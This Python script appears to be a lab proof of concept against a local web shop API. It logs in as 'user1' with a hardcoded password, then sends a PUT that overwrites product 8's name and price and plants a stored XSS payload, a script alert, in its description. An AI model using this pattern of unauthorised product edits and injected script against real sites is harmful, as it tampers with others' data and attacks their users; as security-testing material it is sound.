# Author: Andrew Higgins
# https://github.com/speckly

# TODO: correct the stored XSS code so that it does not break the page products.html without the parameter

import requests
import os

HACKER = True # False will revert back to original
TOKEN = input("Enter the jwt token without the Bearer (default to user1): ")
os.system('cls')
print("Script by @speckly\ndid you know that speckly and skiddie sounds the same\n")

if not TOKEN: # user1, type Customer
    print("Logging into user1 and getting token")
    LOGIN_BODY = {
        "username": "user1",
        "password": "123"
    }
    LOGIN_ENDPOINT = "http://localhost:8081/user/login"
    TOKEN = requests.post(LOGIN_ENDPOINT, json=LOGIN_BODY).json()["token"]

PRODUCT_ID = 8
ENDPOINT = f"http://localhost:8081/product/{PRODUCT_ID}"
PUT_DATA = {
    "name": "Hacked by speckles",
    "description": "hi my name is script alert and here is stored XSS -> <script>alert('kid named script alert')</script>",
    "categoryid": "2",
    "brand": "speckly",
    "price": "0"
} if HACKER == True else {
    "name": "Samsung Galaxy Tab S7",
    "description": "Amazing tablet",
    "categoryid": "2",
    "brand": "Samsung",
    "price": "727"
}
HEADERS = {
    "Authorization": f"Bearer {TOKEN}"
}

print("Modifying product")
response = requests.put(ENDPOINT, json=PUT_DATA, headers=HEADERS)

print("Response Status Code:", response.status_code)
print(f"Response Content: {response.text}")